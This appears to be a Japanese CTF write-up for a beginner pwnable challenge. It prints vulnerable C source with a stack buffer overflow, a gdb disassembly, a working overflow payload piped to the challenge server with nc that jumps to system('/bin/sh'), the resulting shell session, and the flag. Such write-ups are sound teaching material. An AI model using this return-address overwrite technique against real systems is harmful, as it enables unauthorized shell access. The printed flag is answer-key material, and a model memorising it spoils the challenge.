# prediction:Pwnable:50pts
flagが予測できますか？  
```
nc 34.145.29.222 30006
```
Hint  
`system`, `/bin/sh`って見覚えありませんか？  
[dist.zip](dist.zip)  

# Solution
dist.zipが配布され、中身はソースのようだ。  
以下のようになっていた。  
```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// バッファリングを無効化して時間制限を60秒に設定
__attribute__((constructor)) void setup() {
  alarm(60);
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
}

char binsh[0x8] = "/bin/sh";

void debug_stack_dump(unsigned long rsp, unsigned long rbp) {
  unsigned long i;
  puts("\n***start stack dump***");
  i = rsp;
  while (i <= rbp + 32) {
    unsigned long *p;
    p = (unsigned long *)i;
    printf("0x%lx: 0x%016lx", i, *p);
    if (i == rsp) {
      printf(" <- rsp");
    } else if (i == rbp) {
      printf(" <- rbp");
    } else if (i == rbp + 8) {
      printf(" <- return address");
    }
    printf("\n");
    i += 8;
  }
  puts("***end stack dump***\n");
}

void show_flag() {
  char flag_name[0x30];
  printf("What is the flag?");
  flag_name[read(0, flag_name, 0x100) - 1] = '\0';

  if (strncmp(flag_name, "taskctf{", 8) != 0) {
    write(2, "Invalid flag", 13);
    return;
  }

  // ここは正しいflagに差し替えられています
  if (strcmp(flag_name, "taskctf{hogefugapiyo}") == 0) {
    // show FLAG :)
    system(binsh);
  }

  // DEBUG MODE
  // TODO: remove
  {
    register unsigned long rsp asm("rsp");
    register unsigned long rbp asm("rbp");
    debug_stack_dump(rsp, rbp);
  }
}

int main() { show_flag(); }
```
入力が`taskctf{`から始まっている場合に処理が進み、stackがダンプされるようだ。  
リターンアドレスがBOFで書き換えられるので`system(binsh);`を呼び出しているif文の中に飛べばよい。  
```bash
$ gdb ./prediction
~~~
gdb-peda$ disass show_flag
Dump of assembler code for function show_flag:
   0x0000000000401370 <+0>:     endbr64
   0x0000000000401374 <+4>:     push   rbp
   0x0000000000401375 <+5>:     mov    rbp,rsp
   0x0000000000401378 <+8>:     sub    rsp,0x30
   0x000000000040137c <+12>:    lea    rdi,[rip+0xce2]        # 0x402065
   0x0000000000401383 <+19>:    mov    eax,0x0
   0x0000000000401388 <+24>:    call   0x401130 <printf@plt>
   0x000000000040138d <+29>:    lea    rax,[rbp-0x30]
   0x0000000000401391 <+33>:    mov    edx,0x100
   0x0000000000401396 <+38>:    mov    rsi,rax
   0x0000000000401399 <+41>:    mov    edi,0x0
   0x000000000040139e <+46>:    call   0x401150 <read@plt>
   0x00000000004013a3 <+51>:    sub    rax,0x1
   0x00000000004013a7 <+55>:    mov    BYTE PTR [rbp+rax*1-0x30],0x0
   0x00000000004013ac <+60>:    lea    rax,[rbp-0x30]
   0x00000000004013b0 <+64>:    mov    edx,0x8
   0x00000000004013b5 <+69>:    lea    rsi,[rip+0xcbb]        # 0x402077
   0x00000000004013bc <+76>:    mov    rdi,rax
   0x00000000004013bf <+79>:    call   0x4010e0 <strncmp@plt>
   0x00000000004013c4 <+84>:    test   eax,eax
   0x00000000004013c6 <+86>:    je     0x4013e0 <show_flag+112>
   0x00000000004013c8 <+88>:    mov    edx,0xd
   0x00000000004013cd <+93>:    lea    rsi,[rip+0xcac]        # 0x402080
   0x00000000004013d4 <+100>:   mov    edi,0x2
   0x00000000004013d9 <+105>:   call   0x401100 <write@plt>
   0x00000000004013de <+110>:   jmp    0x401414 <show_flag+164>
   0x00000000004013e0 <+112>:   lea    rax,[rbp-0x30]
   0x00000000004013e4 <+116>:   lea    rsi,[rip+0xca2]        # 0x40208d
   0x00000000004013eb <+123>:   mov    rdi,rax
   0x00000000004013ee <+126>:   call   0x401160 <strcmp@plt>
   0x00000000004013f3 <+131>:   test   eax,eax
   0x00000000004013f5 <+133>:   jne    0x401403 <show_flag+147>
   0x00000000004013f7 <+135>:   lea    rdi,[rip+0x2c7a]        # 0x404078 <binsh>
   0x00000000004013fe <+142>:   call   0x401120 <system@plt>
   0x0000000000401403 <+147>:   mov    rdx,rbp
   0x0000000000401406 <+150>:   mov    rax,rsp
   0x0000000000401409 <+153>:   mov    rsi,rdx
   0x000000000040140c <+156>:   mov    rdi,rax
   0x000000000040140f <+159>:   call   0x401293 <debug_stack_dump>
   0x0000000000401414 <+164>:   leave
   0x0000000000401415 <+165>:   ret
End of assembler dump.
```
gdbで見ると、`0x00000000004013f5`に飛べばよさそうであるとわかる。  
以下のように行う。  
```bash
$ (echo -e "taskctf{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xf5\x13\x40" ; cat) | nc 34.145.29.222 30006
What is the flag?
***start stack dump***
0x7fffa32eafa0: 0x7b6674636b736174 <- rsp
0x7fffa32eafa8: 0x4141414141414141
0x7fffa32eafb0: 0x4141414141414141
0x7fffa32eafb8: 0x4141414141414141
0x7fffa32eafc0: 0x4141414141414141
0x7fffa32eafc8: 0x4141414141414141
0x7fffa32eafd0: 0x4141414141414141 <- rbp
0x7fffa32eafd8: 0x00000000004013f5 <- return address
0x7fffa32eafe0: 0x0000000000000000
0x7fffa32eafe8: 0x00007fd9577770b3
0x7fffa32eaff0: 0x00007fd95793c6a0
***end stack dump***

ls
flag
prediction
start.sh
cat flag
taskctf{r0p_1s_f4mous_way}
```
flagが得られた。  
ropしていない…(すまぬ)。  

## taskctf{r0p_1s_f4mous_way}